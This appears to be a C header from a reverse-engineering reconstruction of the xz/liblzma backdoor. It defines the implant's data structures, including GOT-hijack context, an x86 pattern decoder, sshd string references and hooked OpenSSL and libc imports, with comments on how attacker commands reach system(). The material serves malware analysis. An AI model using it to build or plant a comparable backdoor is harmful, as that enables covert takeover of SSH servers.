typedef long ptrdiff_t;

typedef unsigned long size_t;

typedef long ssize_t;

typedef unsigned long uintptr_t;

typedef long intptr_t;

typedef void *va_list;

typedef signed char int8_t;

typedef unsigned char uint8_t;

typedef short int16_t;

typedef unsigned short uint16_t;

typedef int int32_t;

typedef unsigned int uint32_t;

typedef unsigned char uchar;

typedef void code(void);

typedef unsigned short ushort;

typedef unsigned int uint;

typedef long long int64_t;

typedef unsigned long long uint64_t;

typedef unsigned long ulong;

void hexdump(void *pAddressIn, long lSize);

typedef uint8_t u8;

typedef unsigned char byte;

typedef signed char sbyte;

typedef unsigned char undefined;

typedef unsigned char undefined1;

typedef unsigned short undefined2;

typedef uint32_t undefined3;

typedef uint32_t undefined4;

typedef uint64_t undefined7;

typedef uint64_t undefined8;

typedef uint16_t u16;

typedef uint32_t u32;

typedef uint64_t u64;

typedef uintptr_t uptr;

typedef unsigned int pid_t;

typedef unsigned int uid_t;

typedef unsigned int gid_t;

typedef unsigned int mode_t;

typedef uint16_t Elf64_Half;

typedef uint32_t Elf64_Word;

typedef int32_t Elf64_Sword;

typedef uint64_t Elf64_Xword;

typedef int64_t Elf64_Sxword;

typedef uint32_t Elf32_Addr;

typedef uint64_t Elf64_Addr;

typedef uint64_t Elf64_Off;

typedef uint16_t Elf64_Section;

typedef Elf64_Xword Elf64_Relr;

typedef struct
{
  unsigned char e_ident[(16)];
  Elf64_Half e_type;
  Elf64_Half e_machine;
  Elf64_Word e_version;
  Elf64_Addr e_entry;
  Elf64_Off e_phoff;
  Elf64_Off e_shoff;
  Elf64_Word e_flags;
  Elf64_Half e_ehsize;
  Elf64_Half e_phentsize;
  Elf64_Half e_phnum;
  Elf64_Half e_shentsize;
  Elf64_Half e_shnum;
  Elf64_Half e_shstrndx;
} Elf64_Ehdr;

typedef struct
{
  Elf64_Word p_type;
  Elf64_Word p_flags;
  Elf64_Off p_offset;
  Elf64_Addr p_vaddr;
  Elf64_Addr p_paddr;
  Elf64_Xword p_filesz;
  Elf64_Xword p_memsz;
  Elf64_Xword p_align;
} Elf64_Phdr;

typedef union
{
  Elf64_Xword d_val;
  Elf64_Addr d_ptr;
} Elf64_DynValue;

typedef struct
{
  Elf64_Sxword d_tag;
  Elf64_DynValue d_un;
} Elf64_Dyn;

typedef struct
{
  Elf64_Word st_name;
  unsigned char st_info;
  unsigned char st_other;
  Elf64_Section st_shndx;
  Elf64_Addr st_value;
  Elf64_Xword st_size;
} Elf64_Sym;

typedef struct
{
  Elf64_Addr r_offset;
  Elf64_Xword r_info;
  Elf64_Sxword r_addend;
} Elf64_Rela;

typedef uptr
 Elf32_Sym, Elf64_Relr,
 Elf64_Verdef, Elf64_Versym, sigset_t, fd_set;

typedef struct evp_pkey_st EVP_PKEY;

typedef struct rsa_st RSA;

typedef struct dsa_st DSA;

typedef struct bignum_st BIGNUM;

typedef struct ec_point_st EC_POINT;

typedef struct ec_key_st EC_KEY;

typedef struct ec_group_st EC_GROUP;

typedef struct evp_md_st EVP_MD;

typedef struct evp_cipher_st EVP_CIPHER;

typedef struct evp_cipher_ctx_st EVP_CIPHER_CTX;

typedef struct engine_st ENGINE;

typedef struct evp_md_ctx_st EVP_MD_CTX;

typedef struct evp_pkey_ctx_st EVP_PKEY_CTX;

typedef struct bignum_ctx BN_CTX;

typedef unsigned int point_conversion_form_t;

typedef void *(*lzma_alloc_fn)(void *opaque, size_t nmemb, size_t size);

typedef void (*lzma_free_fn)(void *opaque, void *ptr);

typedef struct {
 lzma_alloc_fn alloc;
 lzma_free_fn free;
 void *opaque;
} lzma_allocator;

typedef long int Lmid_t;

/*
 * Subset of liblzma integrity-check identifiers the implant cares about when faking encoder state so we only accept payloads signed with CRC32/CRC64/SHA256.
 */
typedef enum {
 LZMA_CHECK_NONE = 0,
 LZMA_CHECK_CRC32 = 1,
 LZMA_CHECK_CRC64 = 4,
 LZMA_CHECK_SHA256 = 10
} lzma_check;

struct auditstate
{
   uintptr_t cookie;
   unsigned int bindflags;
};

typedef struct link_map *lookup_t;

typedef struct link_map {
 unsigned char _opaque;
} link_map;

typedef struct gnu_hash_table {
 uint32_t nbuckets;
 uint32_t symoffset;
 uint32_t bloom_size;
 uint32_t bloom_shift;
 uint64_t bloom[];
} gnu_hash_table_t;

struct La_i86_regs;

struct La_i86_retval;

struct La_x86_64_regs;

struct La_x86_64_retval;

struct La_x32_regs;

struct La_x32_retval;

typedef void (*audit_activity_fn)(uintptr_t *, unsigned int);

typedef char *(*audit_objsearch_fn)(const char *, uintptr_t *, unsigned int);

typedef unsigned int (*audit_objopen_fn)(struct link_map *, Lmid_t, uintptr_t *);

typedef void (*audit_preinit_fn)(uintptr_t *);

typedef unsigned int (*audit_objclose_fn)(uintptr_t *);

typedef void (*dl_audit_symbind_alt_fn)(struct link_map *l, const Elf64_Sym *ref, void **value, lookup_t result);

typedef uintptr_t (*audit_symbind64_fn)(
  Elf64_Sym *sym, unsigned int ndx,
  uptr *refcook, uptr *defcook,
  unsigned int flags, const char *symname);

typedef union {
  uintptr_t (*symbind32) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, unsigned int *, const char *);
  uintptr_t (*symbind64) (Elf64_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, unsigned int *, const char *);
 } audit_symbind_fn_t;

typedef union {
  Elf32_Addr (*i86_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, struct La_i86_regs *,
   unsigned int *, const char *name,
   long int *framesizep);
  Elf64_Addr (*x86_64_gnu_pltenter) (Elf64_Sym *, unsigned int,
   uintptr_t *,
   uintptr_t *, struct La_x86_64_regs *,
   unsigned int *, const char *name,
   long int *framesizep);
  Elf32_Addr (*x32_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, struct La_x32_regs *,
   unsigned int *, const char *name,
   long int *framesizep);
 } audit_pltenter_fn_t;

typedef union {
   unsigned int (*i86_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, const struct La_i86_regs *,
   struct La_i86_retval *, const char *);
  unsigned int (*x86_64_gnu_pltexit) (Elf64_Sym *, unsigned int,
   uintptr_t *,
   uintptr_t *,
   const struct La_x86_64_regs *,
   struct La_x86_64_retval *,
   const char *);
  unsigned int (*x32_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *,
   const struct La_x32_regs *,
   struct La_x86_64_retval *,
   const char *);
 } audit_pltexit_fn_t;

struct audit_ifaces
{
 audit_activity_fn activity;
 audit_objsearch_fn objsearch;
 audit_objopen_fn objopen;
 audit_preinit_fn preinit;
 audit_symbind_fn_t symbind;
 audit_pltenter_fn_t pltenter;
 audit_pltexit_fn_t pltexit;
 audit_objclose_fn objclose;
 struct audit_ifaces *next;
};

typedef struct audit_ifaces audit_ifaces;

typedef struct {
 uint32_t state[8];
 uint64_t size;
} lzma_sha256_state;

typedef struct {
 uint8_t buffer[64];
 union {
  uint32_t crc32;
  uint64_t crc64;
  lzma_sha256_state sha256;
 } state;
} lzma_check_state;

/*
 * Literal opcode values consumed by the lightweight disassembler so pattern-matching routines can locate MOV/LEA/CALL sequences without pulling in a full decoder.
 */
enum X86_OPCODE {
 X86_OPCODE_LEA = 0x8D,
 X86_OPCODE_CALL = 0xE8,
 X86_OPCODE_CMP = 0x3B,
 X86_OPCODE_MOV = 0x89,
 X86_OPCODE_MOV_LOAD = 0x8B,
 X86_OPCODE_MOV_STORE = 0x8C
};

/*
 * Normalized register identifiers that the decoder uses when it needs to refer to architectural registers (only RBP is currently required).
 */
enum X86_REG {
 X86_REG_RBP = 5
};

typedef enum {
 FALSE = 0,
 TRUE = 1
} BOOL;

/*
 * Bitmask describing which optional instruction prefixes (LOCK/REP, segment overrides, operand/address-size hints, VEX, REX and ModRM) were observed while decoding an x86 instruction.
 */
typedef enum {
 DF1_LOCK_REP = 1,
 DF1_SEG = 2,
 DF1_OSIZE = 4,
 DF1_ASIZE = 8,
 DF1_VEX = 0x10,
 DF1_REX = 0x20,
 DF1_MODRM = 0x40,
 DF1_SIB = 0x80
} InstructionFlags;

/*
 * Secondary flag set emitted by the decoder that captures which addressing features (displacement, immediates, 64-bit immediates) are present for the current instruction.
 */
typedef enum {
 DF2_MEM_DISP = 0x1,
 DF2_MEM_DISP8 = 0x2,
 DF2_MEM_SEG_OFFS = 0x4,
 DF2_FLAGS_MEM = DF2_MEM_DISP | DF2_MEM_DISP8 | DF2_MEM_SEG_OFFS,
 DF2_IMM = 0x8,
 DF2_IMM64 = 0x10
} InstructionFlags2;

/*
 * Bitmask describing which relocation tables, version records, and hardening features were discovered while parsing an ELF image.
 */
typedef enum {
 X_ELF_PLTREL = 0x1,
 X_ELF_RELA = 0x2,
 X_ELF_RELR = 0x4,
 X_ELF_VERDEF = 0x8,
 X_ELF_VERSYM = 0x10,
 X_ELF_NOW = 0x20
} ElfFlags;

/*
 * Categorization of the ModRM byte modes that the instruction search helpers check when scanning for register or displacement based operands.
 */
typedef enum {
 MRM_I_REG,
 MRM_I_DISP1,
 MRM_I_DISP4,
 MRM_D_REG
} ModRm_Mod;

/*
 * High-level opcode families the scanner can search for; currently only used to distinguish ENDBR64 sequences from padding NOPs.
 */
typedef enum {
 FIND_ENDBR64,
 FIND_NOP
} FuncFindType;

/*
 * Stable identifiers for each ELF image we track (main executable, ld.so, libc, liblzma, libcrypto) so helpers can index into shared arrays without raw pointers.
 */
typedef enum {
 X_ELF_MAIN = 0,
 X_ELF_DYNAMIC_LINKER = 1,
 X_ELF_LIBC = 2,
 X_ELF_LIBCRYPTO = 3
} ElfId;

/*
 * Enumerated handles for the small set of sshd status strings we care about when locating code and data references inside the binary.
 */
typedef enum {
 XREF_xcalloc_zero_size = 0,
 XREF_Could_not_chdir_to_home_directory_s_s = 1,
 XREF_list_hostkey_types = 2,
 XREF_demote_sensitive_data = 3,
 XREF_mm_terminate = 4,
 XREF_mm_pty_allocate = 5,
 XREF_mm_do_pam_account = 6,
 XREF_mm_session_pty_cleanup2 = 7,
 XREF_mm_getpwnamallow = 8,
 XREF_mm_sshpam_init_ctx = 9,
 XREF_mm_sshpam_query = 10,
 XREF_mm_sshpam_respond = 11,
 XREF_mm_sshpam_free_ctx = 12,
 XREF_mm_choose_dh = 13,
 XREF_sshpam_respond = 14,
 XREF_sshpam_auth_passwd = 15,
 XREF_sshpam_query = 16,
 XREF_start_pam = 17,
 XREF_mm_request_send = 18,
 XREF_mm_log_handler = 19,
 XREF_Could_not_get_agent_socket = 20,
 XREF_auth_root_allowed = 21,
 XREF_mm_answer_authpassword = 22,
 XREF_mm_answer_keyallowed = 23,
 XREF_mm_answer_keyverify = 24,
 XREF_48s_48s_d_pid_ld_ = 25,
 XREF_Unrecognized_internal_syslog_level_code_d = 26
} StringXrefId;

/*
 * Indexes into the deduplicated string table embedded in xzre’s rodata dump; the values double as offsets into the `string_mask_data` array.
 */
typedef enum {
 STR_from = 0x810,
 STR_ssh2 = 0x678,
 STR_48s_48s_d_pid_ld_ = 0xd8,
 STR_s = 0x708,
 STR_usr_sbin_sshd = 0x108,
 STR_Accepted_password_for = 0x870,
 STR_Accepted_publickey_for = 0x1a0,
 STR_BN_bin2bn = 0xc40,
 STR_BN_bn2bin = 0x6d0,
 STR_BN_dup = 0x958,
 STR_BN_free = 0x418,
 STR_BN_num_bits = 0x4e0,
 STR_Connection_closed_by = 0x790,
 STR_Could_not_chdir_to_home_directory_s_s = 0x18,
 STR_Could_not_get_agent_socket = 0xb0,
 STR_DISPLAY = 0x960,
 STR_DSA_get0_pqg = 0x9d0,
 STR_DSA_get0_pub_key = 0x468,
 STR_EC_KEY_get0_group = 0x7e8,
 STR_EC_KEY_get0_public_key = 0x268,
 STR_EC_POINT_point2oct = 0x6e0,
 STR_EVP_CIPHER_CTX_free = 0xb28,
 STR_EVP_CIPHER_CTX_new = 0x838,
 STR_EVP_DecryptFinal_ex = 0x2a8,
 STR_EVP_DecryptInit_ex = 0xc08,
 STR_EVP_DecryptUpdate = 0x3f0,
 STR_EVP_Digest = 0xf8,
 STR_EVP_DigestVerify = 0x408,
 STR_EVP_DigestVerifyInit = 0x118,
 STR_EVP_MD_CTX_free = 0xd10,
 STR_EVP_MD_CTX_new = 0xaf8,
 STR_EVP_PKEY_free = 0x6f8,
 STR_EVP_PKEY_new_raw_public_key = 0x758,
 STR_EVP_PKEY_set1_RSA = 0x510,
 STR_EVP_chacha20 = 0xc28,
 STR_EVP_sha256 = 0xc60,
 STR_EVP_sm = 0x188,
 STR_GLIBC_2_2_5 = 0x8c0,
 STR_GLRO_dl_naudit_naudit = 0x6a8,
 STR_KRB5CCNAME = 0x1e0,
 STR_LD_AUDIT = 0xcf0,
 STR_LD_BIND_NOT = 0xbc0,
 STR_LD_DEBUG = 0xa90,
 STR_LD_PROFILE = 0xb98,
 STR_LD_USE_LOAD_BIAS = 0x3e0,
 STR_LINES = 0xa88,
 STR_RSA_free = 0xac0,
 STR_RSA_get0_key = 0x798,
 STR_RSA_new = 0x918,
 STR_RSA_public_decrypt = 0x1d0,
 STR_RSA_set0_key = 0x540,
 STR_RSA_sign = 0x8f8,
 STR_SSH_2_0 = 0x990,
 STR_TERM = 0x4a8,
 STR_Unrecognized_internal_syslog_level_code_d = 0xe0,
 STR_WAYLAND_DISPLAY = 0x158,
 STR_errno_location = 0x878,
 STR_libc_stack_end = 0x2b0,
 STR_libc_start_main = 0x228,
 STR_dl_audit_preinit = 0xa60,
 STR_dl_audit_symbind_alt = 0x9c8,
 STR_exit = 0x8a8,
 STR_r_debug = 0x5b0,
 STR_rtld_global = 0x5b8,
 STR_rtld_global_ro = 0xa98,
 STR_auth_root_allowed = 0xb8,
 STR_authenticating = 0x1d8,
 STR_demote_sensitive_data = 0x28,
 STR_getuid = 0x348,
 STR_ld_linux_x86_64_so = 0xa48,
 STR_libc_so = 0x7d0,
 STR_libcrypto_so = 0x7c0,
 STR_liblzma_so = 0x590,
 STR_libsystemd_so = 0x938,
 STR_list_hostkey_types = 0x20,
 STR_malloc_usable_size = 0x440,
 STR_mm_answer_authpassword = 0xc0,
 STR_mm_answer_keyallowed = 0xc8,
 STR_mm_answer_keyverify = 0xd0,
 STR_mm_answer_pam_start = 0x948,
 STR_mm_choose_dh = 0x78,
 STR_mm_do_pam_account = 0x40,
 STR_mm_getpwnamallow = 0x50,
 STR_mm_log_handler = 0xa8,
 STR_mm_pty_allocate = 0x38,
 STR_mm_request_send = 0xa0,
 STR_mm_session_pty_cleanup2 = 0x48,
 STR_mm_sshpam_free_ctx = 0x70,
 STR_mm_sshpam_init_ctx = 0x58,
 STR_mm_sshpam_query = 0x60,
 STR_mm_sshpam_respond = 0x68,
 STR_mm_terminate = 0x30,
 STR_parse_PAM = 0xc58,
 STR_password = 0x400,
 STR_preauth = 0x4f0,
 STR_pselect = 0x690,
 STR_publickey = 0x7b8,
 STR_read = 0x308,
 STR_rsa_sha2_256 = 0x710,
 STR_setlogmask = 0x428,
 STR_setresgid = 0x5f0,
 STR_setresuid = 0xab8,
 STR_shutdown = 0x760,
 STR_ssh_2_0 = 0xd08,
 STR_ssh_rsa_cert_v01_openssh_com = 0x2c8,
 STR_sshpam_auth_passwd = 0x88,
 STR_sshpam_query = 0x90,
 STR_sshpam_respond = 0x80,
 STR_start_pam = 0x98,
 STR_system = 0x9f8,
 STR_unknown = 0x198,
 STR_user = 0xb10,
 STR_write = 0x380,
 STR_xcalloc_zero_size = 0x10,
 STR_yolAbejyiejuvnupEvjtgvsh5okmkAvj = 0xb00,
 STR_ELF = 0x300,
} EncodedStringId;

/*
 * State machine for the payload download/decrypt workflow (only INITIAL is defined so far while the rest of the states are discovered dynamically).
 */
typedef enum {
 PAYLOAD_STATE_INITIAL = -1
} PayloadState;

struct sshbuf {
 u8 *d;
 const u8 *cd;
 size_t off;
 size_t size;
 size_t max_size;
 size_t alloc;
 int readonly;
 u32 refcount;
 struct sshbuf *parent;
};

struct kex {
 u8 opaque;
};

typedef struct kex kex;

struct monitor {
 int m_recvfd;
 int m_sendfd;
 int m_log_recvfd;
 int m_log_sendfd;
 struct kex **m_pkex;
 pid_t m_pid;
};

typedef struct monitor monitor;

struct sensitive_data {
 struct sshkey **host_keys;
 struct sshkey **host_pubkeys;
 struct sshkey **host_certificates;
 int have_ssh2_key;
};

typedef struct sensitive_data sensitive_data;

struct sshkey {
 int type;
 int flags;
 RSA *rsa;
 DSA *dsa;
 int ecdsa_nid;
 EC_KEY *ecdsa;
 u8 *ed25519_sk;
 u8 *ed25519_pk;
 char *xmss_name;
 char *xmss_filename;
 void *xmss_state;
 u8 *xmss_sk;
 u8 *xmss_pk;
 char sk_application;
 u8 sk_flags;
 struct sshbuf *sk_key_handle;
 struct sshbuf *sk_reserved;
 struct sshkey_cert *cert;
 u8 *shielded_private;
 size_t shielded_len;
 u8 *shield_prekey;
 size_t shield_prekey_len;
};

typedef struct sshkey sshkey;

/*
 * Tracks the GOT slot that is currently being patched while hijacking liblzma’s resolver.
 * Holds the slot pointer itself, the original return site, the cpuid trampoline, and the signed displacement so we can roll back or advance the hook safely.
 */
typedef struct __attribute__((packed)) got_ctx {
 void *got_ptr;
 void *return_address;
 void *cpuid_fn;
 ptrdiff_t got_offset;
} got_ctx_t;

/*
 * Lightweight record describing the symbol import we are about to tamper with.
 * Bundles the loader-provided symbol pointer, the `got_ctx_t` used for the patch, and the caller’s stack frame for later restoration.
 */
typedef struct __attribute__((packed)) elf_entry_ctx {
 void *symbol_ptr;
 got_ctx_t got_ctx;
 u64 *frame_address;
} elf_entry_ctx_t;

/*
 * Convenience masks for projecting a decoded ModRM byte into its RM/REG/MOD fields or for retrieving the raw byte from the bit-packed representation.
 */
enum dasm_modrm_mask {
 XZ_MODRM_RM = 0xFF000000,
 XZ_MODRM_REG = 0x00FF0000,
 XZ_MODRM_MOD = 0x0000FF00,
 XZ_MODRM_RAW = 0x000000FF
};

typedef union __attribute__((packed)) {
 struct __attribute__((packed)) {
  u8 B : 1;
  u8 X : 1;
  u8 R : 1;
  u8 W : 1;
  u8 BitPattern : 4;
 } bits;
 u8 rex_byte;
} x86_rex_prefix_t;

typedef union __attribute__((packed)) {
 struct __attribute__((packed)) {
  u8 modrm;
  u8 modrm_mod;
  u8 modrm_reg;
  u8 modrm_rm;
 } breakdown;
 u32 modrm_word;
} x86_modrm_info_t;

typedef struct __attribute__((packed)) {
 u8 flags;
 u8 flags2;
 u8 prefix_padding[2];
 u8 lock_rep_byte;
 u8 seg_byte;
 u8 osize_byte;
 u8 asize_byte;
 u8 vex_byte;
 u8 vex_byte2;
 u8 vex_byte3;
 x86_rex_prefix_t rex;
 x86_modrm_info_t modrm;
} x86_prefix_fields_t;

typedef union __attribute__((packed)) {
 x86_prefix_fields_t decoded;
 u16 flags_u16;
} x86_prefix_state_t;

/*
 * Hand-written x86 decoder used throughout the project to find instructions without shipping a full disassembler.
 * It records prefix bits, VEX/REX state, ModRM/SIB breakdowns, computed operands, and scratch fields so pattern searchers can share one structure.
 */
typedef struct __attribute__((packed)) dasm_ctx {
 u8* instruction; /* Base pointer to the decoded instruction so scanners can rescan or compute RIP-relative targets. */
 u64 instruction_size; /* Number of bytes consumed while decoding `instruction`. */
 x86_prefix_state_t prefix; /* Cached legacy-prefix/VEX/REX breakdown for this decode. */
 u8 mov_imm_reg_index; /* Lower 3 bits of the MOV r64, imm64 destination register (combine with REX.B when present). */
 u8 sib_byte; /* Raw SIB byte when the addressing mode uses one. */
 u8 sib_scale_bits; /* SIB scale component extracted from `sib_byte`. */
 u8 sib_index_bits; /* SIB index register (prior to applying REX.X). */
 u8 sib_base_bits; /* SIB base register (prior to applying REX.B). */
 u8 opcode_window[4]; /* Rolling opcode window that normalises one-, two-, and three-byte opcodes. */
 u8 rel32_bytes[4]; /* Scratch copy of the rel32 displacement bytes for branch/LEA scanners. */
 u64 mem_disp; /* Displacement immediate; when DF1 is set add `instruction + instruction_size` for RIP-relative targets. */
 u64 imm_signed; /* Immediate value sign-extended to 64 bits. */
 u64 imm_zeroextended; /* Immediate value zero-extended to 64 bits. */
 u64 imm_size; /* Size in bytes of the decoded immediate (0 when the opcode lacks one). */
 u8 opcode_offset; /* Offset from `instruction` to the current opcode byte used during decoding. */
 u8 decoder_scratch[7]; /* Zeroed padding the decoder reuses as scratch state. */
} dasm_ctx_t;

/*
 * Parsed view of an ELF image that exposes the headers, relocation tables, version info, code/data segments, and GNU hash metadata needed by the import fix-ups.
 */
typedef struct __attribute__((packed)) elf_info {
 Elf64_Ehdr *elfbase; /* Base pointer to the mapped ELF header used for pointer arithmetic. */
 u64 load_base_vaddr; /* Lowest PT_LOAD virtual address so runtime addrs can be rebased into the file image. */
 Elf64_Phdr *phdrs; /* Program header table inside the mapped object. */
 u64 phdr_count; /* Number of program headers validated by elf_parse. */
 Elf64_Dyn *dynamic_segment; /* PT_DYNAMIC table extracted from the load. */
 u64 dyn_entry_count; /* Number of meaningful dynamic entries discovered before DT_NULL. */
 char *dynstr; /* .dynstr (string table for dynamic symbols). */
 Elf64_Sym *dynsym; /* .dynsym pointer used by the GNU hash walker. */
 Elf64_Rela *plt_relocs; /* DT_JMPREL relocations (PLT/GOT). */
 u32 plt_reloc_count; /* Number of PLT reloc entries. */
 BOOL gnurelro_present; /* TRUE if a PT_GNU_RELRO segment was found. */
 u64 gnurelro_vaddr; /* Virtual address of the GNU_RELRO segment. */
 u64 gnurelro_memsize; /* Length of the GNU_RELRO mapping. */
 Elf64_Verdef *verdef; /* Pointer to version definition records (.gnu.version_d). */
 u64 verdef_count; /* Number of version definitions copied from DT_VERDEFNUM. */
 Elf64_Versym *versym; /* Pointer to .gnu.version for per-symbol version tags. */
 Elf64_Rela *rela_relocs; /* DT_RELA relocation table (non-PLT). */
 u32 rela_reloc_count; /* Number of DT_RELA entries. */
 u32 relr_reserved0; /* Padding/alignment so the RELR pair stays 16-byte aligned. */
 Elf64_Relr *relr_relocs; /* DT_RELR table when the binary uses compact RELR relocations. */
 u32 relr_reloc_count; /* Number of DT_RELR entries. */
 u32 relr_reserved1; /* Additional padding for RELR metadata. */
 u64 text_segment_start; /* Cached start of the executable PT_LOAD segment (page aligned). */
 u64 text_segment_size; /* Size of the cached executable segment. */
 u64 rodata_segment_start; /* Cached start of the read-only data segment. */
 u64 rodata_segment_size; /* Size of the cached rodata segment. */
 u64 data_segment_start; /* Start of the writable PT_LOAD segment (file-backed bytes). */
 u64 data_segment_size; /* Size of writable segment excluding alignment padding. */
 u64 data_segment_padding; /* Extra bytes between the file-backed end and the page boundary. */
 u64 feature_flags; /* Bitmask tracking optional tables (1=PLT,2=RELA,4=RELR,8=VERDEF,0x10=VERSYM,0x20=BIND_NOW). */
 u32 gnu_hash_nbuckets; /* GNU hash header: bucket count. */
 u32 gnu_hash_last_bloom; /* GNU hash header: bloom filter size minus one. */
 u32 gnu_hash_bloom_shift; /* GNU hash header: shift count used by the bloom filter. */
 u32 gnu_hash_reserved; /* Alignment padding before the bloom/bucket/chain pointers. */
 u64 *gnu_hash_bloom; /* Pointer to the bloom filter words. */
 u32 *gnu_hash_buckets; /* Pointer to the GNU hash buckets array. */
 u32 *gnu_hash_chain; /* Pointer to the GNU hash chain table (starting at symbias). */
} elf_info_t;

typedef size_t (*pfn_malloc_usable_size_t)(void *ptr);

typedef uid_t (*pfn_getuid_t)(void);

typedef void (*pfn_exit_t)(int status);

typedef int (*pfn_setresgid_t)(gid_t rgid, gid_t egid, gid_t sgid);

typedef int (*pfn_setresuid_t)(uid_t ruid, uid_t euid, uid_t suid);

typedef int (*pfn_system_t)(const char *command);

typedef ssize_t (*pfn_write_t)(int fd, const void *buf, size_t count);

typedef int (*pfn_pselect_t)(
  int nfds, fd_set *readfds, fd_set *writefds,
  fd_set *exceptfds, const struct timespec *timeout,
  const sigset_t *sigmask);

typedef ssize_t (*pfn_read_t)(int fd, void *buf, size_t count);

typedef int *(*pfn___errno_location_t)(void);

typedef int (*pfn_setlogmask_t)(int mask);

typedef int (*pfn_shutdown_t)(int sockfd, int how);

/*
 * Resolved libc entrypoints used by the implant (pselect/read/write/setresgid/etc.) along with the book-keeping counters for how many symbols were patched successfully.
 */
typedef struct __attribute__((packed)) libc_imports {
 u32 resolved_imports_count; /* Incremented whenever a libc stub resolves; reaching the expected total gates later stages. */
 u32 reserved_imports_padding; /* Alignment padding before the function pointer block. */
 pfn_malloc_usable_size_t malloc_usable_size; /* Fake allocator stub returned by find_dl_audit_offsets so liblzma callers can probe chunk sizes. */
 pfn_getuid_t getuid; /* Used when deciding whether payload commands should attempt privilege changes. */
 pfn_exit_t exit; /* Hard-exit path when hooks fail and sshd should terminate immediately. */
 pfn_setresgid_t setresgid; /* Applied by payload handlers before running `system()` commands. */
 pfn_setresuid_t setresuid; /* Companion to setresgid for privilege swaps. */
 pfn_system_t system; /* Executes decoded attacker commands (payload type 0x3). */
 pfn_write_t write; /* Socket write helper (e.g., feeding canned monitor replies). */
 pfn_pselect_t pselect; /* Used by the fd I/O helpers to mirror sshd's blocking behaviour. */
 pfn_read_t read; /* Read stub allocated during libc resolution so fd_read can avoid the PLT. */
 pfn___errno_location_t __errno_location; /* Provides thread-local errno access for the fd shims. */
 pfn_setlogmask_t setlogmask; /* Lets the implant silence syslog noise before patching. */
 pfn_shutdown_t shutdown; /* Allows hooks to close sockets cleanly when aborting connections. */
 void *__libc_stack_end; /* Snapshot of libc's __libc_stack_end so the fake allocator/import resolver can restore stack metadata. */
} libc_imports_t;

typedef int (*pfn_RSA_public_decrypt_t)(
 int flen, unsigned char *from, unsigned char *to,
 RSA *rsa, int padding);

typedef int (*pfn_EVP_PKEY_set1_RSA_t)(EVP_PKEY *pkey, struct rsa_st *key);

typedef void (*pfn_RSA_get0_key_t)(
 const RSA *r,
 const BIGNUM **n, const BIGNUM **e, const BIGNUM **d);

typedef void (*pfn_DSA_get0_pqg_t)(
  const DSA *d, const BIGNUM **p,
  const BIGNUM **q, const BIGNUM **g);

typedef const BIGNUM *(*pfn_DSA_get0_pub_key_t)(const DSA *d);

typedef size_t (*pfn_EC_POINT_point2oct_t)(
  const EC_GROUP *group, const EC_POINT *p,
  point_conversion_form_t form, unsigned char *buf,
  size_t len, BN_CTX *ctx);

typedef EC_POINT *(*pfn_EC_KEY_get0_public_key_t)(const EC_KEY *key);

typedef const EC_GROUP *(*pfn_EC_KEY_get0_group_t)(const EC_KEY *key);

typedef EVP_MD *(*pfn_EVP_sha256_t)(void);

typedef int (*pfn_BN_num_bits_t)(const BIGNUM *a);

typedef EVP_PKEY *(*pfn_EVP_PKEY_new_raw_public_key_t)(
  int type, ENGINE *e,
  const unsigned char *key, size_t keylen);

typedef EVP_MD_CTX *(*pfn_EVP_MD_CTX_new_t)(void);

typedef int (*pfn_EVP_DigestVerifyInit_t)(
  EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,
  const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);

typedef int (*pfn_EVP_DigestVerify_t)(
  EVP_MD_CTX *ctx, const unsigned char *sig,
  size_t siglen, const unsigned char *tbs, size_t tbslen);

typedef void (*pfn_EVP_MD_CTX_free_t)(EVP_MD_CTX *ctx);

typedef void (*pfn_EVP_PKEY_free_t)(EVP_PKEY *key);

typedef EVP_CIPHER_CTX *(*pfn_EVP_CIPHER_CTX_new_t)(void);

typedef int (*pfn_EVP_DecryptInit_ex_t)(
  EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,
  ENGINE *impl, const unsigned char *key, const unsigned char *iv);

typedef int (*pfn_EVP_DecryptUpdate_t)(
  EVP_CIPHER_CTX *ctx, unsigned char *out,
  int *outl, const unsigned char *in, int inl);

typedef int (*pfn_EVP_DecryptFinal_ex_t)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);

typedef void (*pfn_EVP_CIPHER_CTX_free_t)(EVP_CIPHER_CTX *ctx);

typedef const EVP_CIPHER *(*pfn_EVP_chacha20_t)(void);

typedef RSA *(*pfn_RSA_new_t)(void);

typedef BIGNUM *(*pfn_BN_dup_t)(const BIGNUM *from);

typedef BIGNUM *(*pfn_BN_bin2bn_t)(const unsigned char *s, int len, BIGNUM *ret);

typedef int (*pfn_RSA_set0_key_t)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);

typedef int (*pfn_EVP_Digest_t)(
  const void *data, size_t count, unsigned char *md,
  unsigned int *size, const EVP_MD *type, ENGINE *impl);

typedef int (*pfn_RSA_sign_t)(
  int type,
  const unsigned char *m, unsigned int m_len,
  unsigned char *sigret, unsigned int *siglen, RSA *rsa);

typedef int (*pfn_BN_bn2bin_t)(const BIGNUM *a, unsigned char *to);

typedef void (*pfn_RSA_free_t)(RSA *rsa);

typedef void (*pfn_BN_free_t)(BIGNUM *a);

/*
 * All non-libc function pointers the payload needs (RSA/EVP/BN helpers, chacha decrypt, etc.) plus access to the owning `libc_imports_t` so callers can reach both sets via one pointer.
 */
typedef struct __attribute__((packed)) imported_funcs {
 pfn_RSA_public_decrypt_t RSA_public_decrypt_orig; /* Saved pointer to the genuine RSA_public_decrypt implementation. */
 pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA_orig; /* Original EVP_PKEY_set1_RSA before hooks attach. */
 pfn_RSA_get0_key_t RSA_get0_key_orig; /* Original RSA_get0_key before hooks attach. */
 pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt; /* sshd’s PLT slot; populated when the loader finds the GOT entry. */
 pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt; /* sshd’s PLT slot for EVP_PKEY_set1_RSA. */
